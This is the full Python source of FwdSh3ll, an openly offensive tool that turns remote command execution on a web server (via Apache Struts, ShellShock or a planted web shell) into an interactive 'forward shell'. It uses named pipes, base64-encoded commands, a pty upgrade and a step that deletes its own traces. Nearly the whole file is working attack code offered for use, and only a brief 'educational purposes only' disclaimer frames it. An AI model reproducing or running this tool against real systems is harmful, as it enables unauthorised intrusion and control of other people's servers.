#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
@file FwdSh3ll.py
@author Sam Freeside <scr.im/emsnovvcrash>
@date 2018-09

@brief Forward shell generation framework.

@disclaimer
LEGAL DISCLAIMER

FwdSh3ll was written for use in educational purposes only. Using this tool
for attacking web servers without prior mutual consistency can be considered
as an illegal activity. It is the final user's responsibility to obey all
applicable local, state and federal laws.

The author assume no liability and is not responsible for any misuse or
damage caused by this tool.
@enddisclaimer
"""

import threading
import random
import string
import re

import requests

from importlib import import_module
from base64 import b64encode
from time import sleep
from os import listdir

from termcolor import colored, cprint

from core.updater import updater
from core.cliopts import cliOptions
from core.common import BANNER

INPUT = 'fwdshin'
OUTPUT = 'fwdshout'


class ForwardShell:
	def __init__(self, url, proxy, payloadName, genPayload, pipesPath, useBase64, interval=1.3):
		self._url = url
		self._proxy = proxy
		self._payloadName = payloadName
		self._genPayload = genPayload
		self._useBase64 = useBase64
		self._interval = interval
		self._delim = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))

		self._session = random.randrange(10000, 99999)
		self._stdin = f'{pipesPath}/{INPUT}.{self._session}'
		self._stdout = f'{pipesPath}/{OUTPUT}.{self._session}'
		cprint(f'[*] Session ID: {self._session}', 'green')

		cprint('[*] Setting up forward shell on target', 'green')
		createNamedPipes = f'mkfifo {self._stdin}; tail -f {self._stdin} | /bin/sh >& {self._stdout}'
		ForwardShell.runRawCmd(createNamedPipes, self._url, self._proxy, self._payloadName, self._genPayload, timeout=0.5, firstConnect=True)

		cprint('[*] Setting up read thread', 'green')
		self._lock = threading.Lock()
		thread = threading.Thread(target=self._readCmd, args=())
		thread.daemon = True
		thread.start()

		cprint('[*] Press CTRL-C to terminate session', 'green')

	def _readCmd(self):
		getOutput = f'/bin/cat {self._stdout}'

		while True:
			result = ForwardShell.runRawCmd(getOutput, self._url, self._proxy, self._payloadName, self._genPayload)

			if result:
				try:
					result = re.search(rf'{self._delim}(.*?){self._delim}', result, re.DOTALL).group(1)
				except AttributeError:
					pass
				else:
					result = result.lstrip()

				with self._lock:
					print(result)

				clearOutput = f'echo -n "" > {self._stdout}'
				ForwardShell.runRawCmd(clearOutput, self._url, self._proxy, self._payloadName, self._genPayload)

			sleep(self._interval)

	@staticmethod
	def runRawCmd(cmd, url, proxy, payloadName, genPayload, timeout=50, firstConnect=False):
		if payloadName == 'ApacheStruts':
			payload = genPayload(cmd)
			headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload}
		elif payloadName == 'ShellShock':
			payload = genPayload(cmd)
			headers = {'User-Agent': payload}
		elif payloadName == 'WebShell':
			url += cmd
			headers = {'User-Agent': 'Mozilla/5.0'}

		while True:
			page = b''
			try:
				with requests.get(
					url,
					headers=headers,
					proxies=proxy,
					timeout=timeout,
					verify=False,
					allow_redirects=False,
					stream=True
				) as resp:
					for i in resp.iter_content():
						page += i
				break

			except requests.exceptions.ChunkedEncodingError as e:
				break

			except requests.exceptions.ReadTimeout:
				return None

			except requests.packages.urllib3.exceptions.ConnectTimeoutError:
				cprint('[!] Connection timeout error, retrying', 'yellow')
				if firstConnect:
					firstConnect = False
					continue
				cprint('[-] Connection timeout error', 'red')
				return None

			except Exception as e:
				print(payload)
				cprint(f'[!] Exception caught: {str(e)}', 'red')
				return None

		return page.decode('utf-8')

	def writeCmd(self, cmd, namedPipes=True):
		if namedPipes:
			cmd = f'echo {self._delim};' + cmd + f';echo {self._delim}\n'
			if self._useBase64:
				cmd = b64encode(cmd.encode('utf-8')).decode('utf-8')
				cmd = f'echo {cmd} | base64 -d > {self._stdin}'
			else:
				cmd = f'echo {cmd} > {self._stdin}'
		else:
			cmd = f'{cmd}\n'
			if self._useBase64:
				cmd = b64encode(cmd.encode('utf-8')).decode('utf-8')
				cmd = f'echo {cmd} | base64 -d | /bin/sh > /dev/null'
			else:
				cmd = f'echo {cmd} | /bin/sh > /dev/null'

		ForwardShell.runRawCmd(cmd, self._url, self._proxy, self._payloadName, self._genPayload)
		sleep(self._interval * 1.2)

	def upgradeToPty(self):
		upgradeShell = """python3 -c 'import pty; pty.spawn("/bin/bash")'"""
		self.writeCmd(upgradeShell, namedPipes=False)


def main():
	print(BANNER)

	args = cliOptions()

	allPayloads = [pn[:-3] for pn in sorted(listdir('./payloads')) if pn.endswith('.py') and not pn.startswith('_')]
	updater(allPayloads)

	print()
	while True:
		url = input(colored('[>] Please enter target URL:  ', 'magenta')).rstrip()
		if url:
			url = url.rstrip()
			break

	proxy = input(colored('[>] Please enter proxy URL (optional):  ', 'magenta'))
	if proxy:
		proxy = proxy.rstrip()
		proxy = {proxy.split('://')[0]: proxy}
	else:
		proxy = {}

	print('\n[?] Which payload you would like to use?\n')

	for i, payloadName in enumerate(allPayloads):
		print(f'    {i + 1}. {payloadName}')

	print()
	while True:
		payloadNum = input(colored('[>] Please enter the number of your choice:  ', 'magenta')).rstrip()
		try:
			payloadNum = int(payloadNum)
			if payloadNum in range(1, len(allPayloads) + 1):
				payloadName = allPayloads[payloadNum - 1]
				payloadModule = import_module('payloads.' + payloadName)
				break
		except ValueError:
			pass

	print('\n[?] Would you like to run a single command or get a forward shell?\n')
	print('    1. Single command')
	print('    2. Forward shell\n')

	while True:
		choice = input(colored('[>] Please enter the number of your choice:  ', 'magenta')).rstrip()

		if choice == '1':
			cprint('\n############################### SINGLE CMD MODE ###############################\n', 'red')
			cmd = input(colored('[>] Please enter the command you would like to execute:  ', 'magenta')).rstrip()
			out = ForwardShell.runRawCmd(cmd, url, proxy, payloadName, payloadModule.genPayload)
			if out is not None:
				print('\n' + out)
			else:
				cprint('[-] An error has occured', 'red')
			break

		elif choice == '2':
			cprint('\n############################## FORWARD SHELL MODE #############################\n', 'red')
			prompt = colored('FwdSh3ll> ', 'magenta')
			sh = ForwardShell(url, proxy, payloadName, payloadModule.genPayload, args.pipes_path, args.no_base64)
			print()

			try:
				while True:
					cmd = input(prompt).strip()
					if not cmd:
						continue
					elif cmd == 'pty':
						prompt = ''
						sh.upgradeToPty()
					else:
						sh.writeCmd(cmd)

			except KeyboardInterrupt:
				cprint('\n\n[*] Terminating shell, cleaning up the mess\n', 'green')
				del sh
				b64Cmd = b64encode(f'rm -f {args.pipes_path}/{INPUT}.* {args.pipes_path}/{OUTPUT}.*\n'.encode('utf-8')).decode('utf-8')
				ForwardShell.runRawCmd(f'echo {b64Cmd} | base64 -d | /bin/sh > /dev/null', url, proxy, payloadName, payloadModule.genPayload)
				break


if __name__ == '__main__':
	main()
